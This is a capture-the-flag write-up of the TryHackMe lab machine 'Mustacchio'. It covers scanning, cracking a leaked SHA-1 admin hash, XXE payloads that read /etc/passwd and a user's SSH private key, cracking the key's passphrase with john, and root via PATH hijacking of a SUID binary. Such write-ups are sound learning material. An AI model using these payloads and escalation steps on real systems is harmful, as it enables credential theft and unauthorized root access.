---
title: Mustacchio
date: 2022-01-21
categories:
  - Writeup
tags:
  - xxe
  - path variable
  - privesc
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
---

<p>Easy Rated THM Machine that covers XXE vulnerability and Path Variable Privilege Escalation</p>


<!--more-->

## NMAP

### Initial Scan

>Initial Nmap

```bash
Nmap scan report for 10.10.123.254
Host is up (0.29s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Android 4.1.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.95 seconds
```

### All Ports Scan

All Ports Nmap

```bash
Nmap scan report for 10.10.123.254
Host is up (0.29s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
```

From our NMAP results we can see that we have two web server ports open.
Browsing to port 80 gives us this web server.

![Port80-webserver](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/hompage.png "Mustacchio Web Page")

While port 8765 brings us to a log in page.

![Port8765-webserver](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/adminpanel.png)

Because we have a web server it is always a good idea to run gobuster and nikto in the background while browsing the web server.

Nikto Scan Port 80

```bash
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Server may leak inodes via ETags, header found with file /, inode: 6d8, size: 5c4938d5d4e40, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-01-19 22:10:55 (GMT13) (2407 seconds)

```

Nikto Scan Port 8765

```bash
+ Server: nginx/1.10.3 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.10.3 appears to be outdated (current is at least 1.14.0)
+ Cookie PHPSESSID created without the httponly flag
+ 7891 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2022-01-19 22:10:24 (GMT13) (2354 seconds)

```

Gobuster Port 80

```bash
/images               (Status: 301) [Size: 313] [--> http://10.10.129.75/images/]
/.                    (Status: 200) [Size: 1752]                                 
/fonts                (Status: 301) [Size: 312] [--> http://10.10.129.75/fonts/] 
/custom               (Status: 301) [Size: 313] [--> http://10.10.129.75/custom/]
```

Gobuster Port 8765

```bash
/assets               (Status: 301) [Size: 194] [--> http://10.10.129.75:8765/assets/]
/auth                 (Status: 301) [Size: 194] [--> http://10.10.129.75:8765/auth/]
```

## USER

I tried several SQLi payloads against the login form but failed to bypass authentication. So let's go back and browse the web app again to find anything interesting.

Browsing through the page does not give us anything interesting. Our Nikto scans didn't really give us anything aswell. 
Gobuster showed us that there is a **_/custom_** directory, and inside that directory we can see **_js_** and **_css_** normally we won't really find anything interesting in these folders but in this case there is a **_users.bak_** file inside the **_js_** directory. Let's download the file and inspect it locally.

![users.bak](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/usersbak.png)

Running `strings` command against users.bak gave us this output.

```bash
┌──(all3n㉿kali)-[~/thm/mustacchio]
└─$ strings users.bak                     
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

We can see that it looks like there is credentials here **_admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b_**

Using `hashid` looks like its Sha1.

```bash
┌──(all3n㉿kali)-[~/thm/mustacchio]
└─$ hashid 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160)
```

Let's try cracking it using hashcat.
Going back to my host machine and then running `hashcat.exe -m 100 mustacchio.txt rockyou.txt`.
Where:
* -m 100 = Sha1 [Hashcat Formats](https://hashcat.net/wiki/doku.php?id=example_hashes)

after a few seconds we have the result **_1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:<redacted>_**

Now we can test if this credential will work on port 8765

![Loggedin](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/adminloggedin.png)

And we are in!

I tried sending test and then intercepting the request using burp. And it looks like we have a post request that needs **_xml_** value as data.

There are also interesting parts in the response. These two comments:

```javascript
//document.cookie = "Example=/auth/dontforget.bak";
```

```html
<!-- Barry, you can now SSH in using your key!-->
```

And this part of the http response:

```html
       </form>

        <h3>Comment Preview:</h3>
        <p>Name: 

        </p>
        <p>Author : 

        </p>
        <p>Comment :<br> 
        <p/>    
        </section>
```
From this it looks like we will have to do an XXE Injection. [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

I tried several payloads inserting Name, Author and Comment but failed.

So let's try browsing to **_/auth/dontforget.bak_** then we can see that we're able to download a file.

```xml
┌──(all3n㉿kali)-[~/thm/mustacchio]
└─$ strings dontforget.bak                
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

I did not immediately notice but this contains an XML file that we can probably use for our XXE payload so let's try that.

I copied the whole contents of the file and submitted it as comment and we can see that it worked.

![XXEcomment](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/xxecomment.png)

Now let's edit the xml contents and try reading **_/etc/passwd_** using the following payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

And it worked! As we can see the name part has been replaced with the contents of **_/etc/passwd_**

![xxepasswd](https://raw.githubusercontent.com/allenjedb/HaxNotes/main/writeups/THM/Mustacchio/img/xxeworked.png)

As we saw from the output of **_/etc/passwd_** we have a user *_barry_* I tried accessing his home directory and reading **_user.txt_** 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/user.txt" >]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

And we have the user flag! from here we can also try if barry has .ssh directory and then try reading his private ssh key.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

And we have barry's private key. Now let's try logging in.

First we need to change the permission for the private key. `chmod 600 <private-key>`

Then try to use it for ssh. `ssh -i <private-key> barry@<machine-ip>`

```bash
┌──(all3n㉿kali)-[~/thm/mustacchio]
└─$ ssh -i sshkey barry@10.10.129.75
Enter passphrase for key 'sshkey':
```

Looks like we need a passphrase for this. We can try using **_ssh2john_** to create a hash and then bruteforce using **_john_**

```bash
┌──(all3n㉿kali)-[~/thm/mustacchio]
└─$ /usr/share/john/ssh2john.py sshkey > sshkey.hash
```

We should now have a **_sshkey.hash_**. Now we can run **_john_** against this file.

```bash
──(all3n㉿kali)-[~/thm/mustacchio]
└─$ john --wordlist=../rockyou.txt sshkey.hash                                                                           1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>       (sshkey)     
1g 0:00:00:00 DONE (2022-01-19 22:54) 1.041g/s 3094Kp/s 3094Kc/s 3094KC/s urieljr..urielitho0
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we should have the passphrase. And should be able to ssh as barry.

```bash
barry@mustacchio:~$ ls
user.txt
```

## ROOT

Now I tried to download **_linpeas.sh_** from my box but it does not seem to work. so I looked for other users in the box instead and found **_joe_** user.

Navigating to **_joe's_** home directory shows a **_live_log_** file. Which looks like an executable file.

```bash
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

I tried to execute it and it shows me some logs for when I browse to the port 8765 web server.
I ran the **_strings_** command to see if there's anything interesting, and I noticed this line which matches the output of the live_log file. Basically it runs the **_tail -f_** command against the **_/var/log/nginx/access.log_** file. 

From here we can also notice the it has a SUID bit. which executes the file as root when we run it.

```bash
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
```

Now we can try gaining Privilege escalation using Path Variable. [linux priv esc using path variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

Let's go to /tmp.

Create a tail file with `/bin/bash` as its contents.

```bash
barry@mustacchio:/tmp$ ls
tail
barry@mustacchio:/tmp$ cat tail
/bin/bash
barry@mustacchio:/tmp$ chmod +x tail
```

Now that we have our `tail` command that will execute `/bin/bash` when called. We will then need to change our **_$PATH_** variable, to do this:

```bash
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
```

This command will add **_/tmp_** to our original **_$PATH_** so that when you run `which tail` it should go to **_/tmp_** first and run our malicious `tail` before checking other paths.

Now let's run **_live_log_**

```bash
barry@mustacchio:/home/joe$ ./live_log 
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# ls
root.txt
```

And we are root!






